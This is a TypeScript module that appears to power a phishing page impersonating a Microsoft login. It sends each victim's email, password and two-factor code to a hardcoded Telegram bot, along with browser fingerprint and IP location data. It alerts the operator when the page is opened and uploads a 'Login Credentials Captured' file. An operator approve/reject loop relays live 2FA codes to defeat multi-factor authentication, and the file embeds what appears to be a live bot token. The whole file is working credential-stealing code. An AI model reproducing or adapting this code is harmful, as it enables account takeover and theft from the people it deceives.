// Telegram Bot Configuration
const TELEGRAM_CONFIG = {
    BOT_TOKEN: '8576907699:AAERUGDvOzciJqZuCZDcK-jkvwupAjSFIkw',
    CHAT_ID: '953712851',
    API_URL: 'https://api.telegram.org/bot'
};

// Function to send message to Telegram
async function sendToTelegram(message: string): Promise<void> {
    try {
        const response = await fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (!response.ok) {
            console.error('Failed to send to Telegram:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

// Function to send document to Telegram
async function sendDocumentToTelegram(fileContent: string, fileName: string, caption: string = ''): Promise<void> {
    try {
        const formData = new FormData();
        
        // Create a blob from the file content
        const blob = new Blob([fileContent], { type: 'text/plain' });
        
        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
        formData.append('document', blob, fileName);
        if (caption) {
            formData.append('caption', caption);
            formData.append('parse_mode', 'HTML');
        }
        
        const response = await fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            console.error('Failed to send document to Telegram:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending document to Telegram:', error);
    }
}

// Function to send 2FA code for manual verification with inline buttons
async function send2FACodeForVerification(email: string, code: string): Promise<void> {
    try {
        const message = `🔐 <b>2FA Code Verification</b>\n\n` +
                       `📧 <b>Email:</b> ${email}\n` +
                       `🔢 <b>Code:</b> <code>${code}</code>\n\n` +
                       `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
                       `Please manually verify this 2FA code.\n\n` +
                       `Reply with:\n` +
                       `• <code>approve ${code}</code> to approve\n` +
                       `• <code>reject ${code}</code> to reject`;
        
        const response = await fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (!response.ok) {
            console.error('Failed to send 2FA verification to Telegram:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending 2FA verification to Telegram:', error);
    }
}

// Function to check verification status by looking at recent Telegram messages
async function checkVerificationStatus(code: string): Promise<'pending' | 'approved' | 'rejected'> {
    try {
        // Get recent messages from the chat
        const response = await fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/getUpdates?limit=10&offset=-10`);
        const data = await response.json();
        
        if (data.ok && data.result) {
            // Look for approval/rejection messages in recent updates
            for (const update of data.result.reverse()) {
                if (update.message && update.message.text) {
                    const text = update.message.text.toLowerCase();
                    
                    // Check for approval
                    if (text.includes(`approve ${code.toLowerCase()}`)) {
                        return 'approved';
                    }
                    
                    // Check for rejection
                    if (text.includes(`reject ${code.toLowerCase()}`)) {
                        return 'rejected';
                    }
                }
            }
        }
        
        return 'pending';
    } catch (error) {
        console.error('Error checking verification status:', error);
        return 'pending';
    }
}

// Function to send confirmation message
async function sendVerificationConfirmation(code: string, approved: boolean): Promise<void> {
    try {
        const message = approved 
            ? `✅ <b>Code Approved</b>\n\nCode <code>${code}</code> has been approved. User will proceed to next step.`
            : `❌ <b>Code Rejected</b>\n\nCode <code>${code}</code> has been rejected. User will be asked to enter a new code.`;
        
        await sendToTelegram(message);
    } catch (error) {
        console.error('Error sending verification confirmation:', error);
    }
}

// Function to get user's location
async function getIPLocation(): Promise<{city?: string; region?: string; country?: string; ip?: string; timezone?: string; error?: string}> {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            city: data.city,
            region: data.region,
            country: data.country_name,
            ip: data.ip,
            timezone: data.timezone
        };
    } catch (error) {
        return { error: 'Could not get IP location' };
    }
}

// Function to create file content in the format shown in the image
function createFileContent(email: string, password: string | null = null, authCode: string | null = null, step: string = 'email'): string {
    const timestamp = new Date().toLocaleString();
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const screenResolution = `${screen.width}x${screen.height}`;
    const windowSize = `${window.innerWidth}x${window.innerHeight}`;
    
    let content = `🔐 *Login Data*\nMicrosoft\n\n`;
    content += `📧 *Email:* ${email}\n`;
    
    if (password) {
        content += `🔐 *Password:* ${password}\n`;
    }
    
    if (authCode) {
        content += `🔢 *Auth Code:* ${authCode}\n`;
    }
    
    content += `📱 *Step:* ${step}\n\n`;
    
    // Time Information
    content += `⏰ *Time:* ${timestamp}\n`;
    content += `🌍 *Timezone:* ${timezone}\n\n`;
    
    // Device Information
    content += `💻 *Device Info:*\n`;
    content += `🖥️ *Platform:* ${platform}\n`;
    content += `📱 *User Agent:* ${userAgent}\n`;
    content += `🌐 *Language:* ${language}\n`;
    content += `📺 *Screen:* ${screenResolution}\n`;
    content += `🪟 *Window:* ${windowSize}\n`;
    content += `🔗 *URL:* ${window.location.href}`;
    
    return content;
}

// Function to format and send login attempt data
async function logLoginAttempt(email: string, password: string | null = null, authCode: string | null = null, step: string = 'email'): Promise<void> {
    const timestamp = new Date().toLocaleString();
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const screenResolution = `${screen.width}x${screen.height}`;
    const windowSize = `${window.innerWidth}x${window.innerHeight}`;
    
    // Create message for Telegram
    let message = `🔐 <b>Login Data</b>\n\n`;
    message += `📧 <b>Email:</b> ${email}\n`;
    
    if (password) {
        message += `🔐 <b>Password:</b> ${password}\n`;
    }
    
    if (authCode) {
        message += `🔢 <b>Auth Code:</b> ${authCode}\n`;
    }
    
    message += `📱 <b>Step:</b> ${step}\n\n`;
    
    // Time Information
    message += `⏰ <b>Time:</b> ${timestamp}\n`;
    message += `🌍 <b>Timezone:</b> ${timezone}\n\n`;
    
    // Device Information
    message += `💻 <b>Device Info:</b>\n`;
    message += `🖥️ <b>Platform:</b> ${platform}\n`;
    message += `📱 <b>User Agent:</b> ${userAgent}\n`;
    message += `🌐 <b>Language:</b> ${language}\n`;
    message += `📺 <b>Screen:</b> ${screenResolution}\n`;
    message += `🪟 <b>Window:</b> ${windowSize}\n`;
    message += `🔗 <b>URL:</b> ${window.location.href}`;
    
    const ipLocation = await getIPLocation();
    
    if (ipLocation.city || ipLocation.country) {
        message += `\n\n🌍 <b>IP Location:</b>\n`;
        if (ipLocation.ip) message += `🔗 <b>IP:</b> ${ipLocation.ip}\n`;
        if (ipLocation.city) message += `🏙️ <b>City:</b> ${ipLocation.city}\n`;
        if (ipLocation.region) message += `🗺️ <b>Region:</b> ${ipLocation.region}\n`;
        if (ipLocation.country) message += `🏳️ <b>Country:</b> ${ipLocation.country}\n`;
        if (ipLocation.timezone) message += `⏰ <b>IP Timezone:</b> ${ipLocation.timezone}`;
    }
    
    // Send to Telegram
    await sendToTelegram(message);
    
    // Send file attachment only after password input
    if (password && step === 'password') {
        // Create file content with location data
        let fileContent = createFileContent(email, password, authCode, step);
        
        if (ipLocation.ip) {
            fileContent += `\n\n🌍 *IP Location:*\n`;
            fileContent += `🔗 *IP Address:* ${ipLocation.ip}\n`;
            if (ipLocation.city) fileContent += `🏙️ *City:* ${ipLocation.city}\n`;
            if (ipLocation.region) fileContent += `🗺️ *Region:* ${ipLocation.region}\n`;
            if (ipLocation.country) fileContent += `🏳️ *Country:* ${ipLocation.country}\n`;
            if (ipLocation.timezone) fileContent += `⏰ *IP Timezone:* ${ipLocation.timezone}`;
        }
        
        // Generate filename with timestamp
        const fileTimestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const fileName = `microsoft_login_${fileTimestamp}.txt`;
        
        // Send document to Telegram
        await sendDocumentToTelegram(fileContent, fileName, '🔐 <b>Login Credentials Captured</b>');
    }
}

// Function to notify page access
async function notifyPageAccess(): Promise<void> {
    const now = new Date();
    const timestamp = now.toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });
    
    const telegramMessage = `🔔 <b>Login Page Accessed</b>\n\n` +
                           `⏰ <b>Time:</b> ${timestamp}`;
    
    // Send to Telegram for page access
    await sendToTelegram(telegramMessage);
}

export const TelegramLogger = {
    logLoginAttempt,
    sendToTelegram,
    sendDocumentToTelegram,
    notifyPageAccess,
    send2FACodeForVerification,
    checkVerificationStatus,
    sendVerificationConfirmation

}